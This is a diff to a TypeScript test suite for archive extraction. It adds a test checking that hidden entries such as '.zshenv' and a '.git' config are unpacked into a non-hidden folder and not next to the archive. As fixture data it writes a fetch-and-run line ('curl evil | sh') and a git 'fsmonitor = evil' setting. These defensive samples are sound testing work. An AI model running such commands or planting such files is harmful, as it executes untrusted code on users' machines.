@@ -469,6 +469,27 @@ describe('archives', () => {
     await expect(f.extract(join(w.home, 'two.zip'), 'c')).rejects.toBeInstanceOf(Cancelled)
   })
 
+  it('never drops a hidden name next to the archive: a hidden item goes into a folder, and that folder is not hidden', async () => {
+    const { finder, home } = await world()
+    await makeZip(join(home, 'dots.zip'), (z) => z.addBuffer(Buffer.from('curl evil | sh'), '.zshenv'))
+    const out = await finder.extract(join(home, 'dots.zip'), 'd')
+    expect(out).toBe(join(home, 'dots'))
+    expect(await readFile(join(out, '.zshenv'), 'utf8')).toBe('curl evil | sh')
+    expect(existsSync(join(home, '.zshenv'))).toBe(false)
+
+    await makeZip(join(home, '.git.zip'), (z) => {
+      z.addBuffer(Buffer.from('[core]\n\tfsmonitor = evil'), 'config')
+      z.addBuffer(Buffer.from('ref: refs/heads/main'), 'HEAD')
+    })
+    expect(await finder.extract(join(home, '.git.zip'), 'g')).toBe(join(home, 'git'))
+    await makeZip(join(home, '..zip'), (z) => {
+      z.addBuffer(Buffer.from('1'), 'a.txt')
+      z.addBuffer(Buffer.from('2'), 'b.txt')
+    })
+    expect(await finder.extract(join(home, '..zip'), 'a')).toBe(join(home, 'Archive'))
+    expect((await readdir(home)).filter((n) => n.startsWith('.') && n !== '.git.zip' && n !== '..zip')).toEqual([])
+  })
+
   /** A tar header block (ustar unless asked otherwise), with a valid checksum. */
   function tarHeader(name: string, o: { size?: number; type?: string; mode?: number | null; prefix?: string; ustar?: boolean; base256?: boolean } = {}) {
     const b = Buffer.alloc(512)
@@ -531,9 +552,9 @@ describe('archives', () => {
     expect((await readdir(both)).sort()).toEqual(['x.txt', 'y.txt'])
     await writeFile(join(home, 'one.tar.gz'), gzipSync(tar(entry('solo.txt', 'solo'))))
     expect(await finder.extract(join(home, 'one.tar.gz'), 't3')).toBe(join(home, 'solo.txt'))
-    // An archive called just ".tar": the result is named after the file.
+    // An archive called just ".tar": the result is named after the file — without its dot (no hidden folder).
     await writeFile(join(home, '.tar'), tar(entry('p.txt', 'p'), entry('q.txt', 'q')))
-    expect(await finder.extract(join(home, '.tar'), 't4')).toBe(join(home, '.tar 2'))
+    expect(await finder.extract(join(home, '.tar'), 't4')).toBe(join(home, 'tar'))
   })
 
   it('refuses broken, unsafe and truncated tars — leaving nothing behind', async () => {
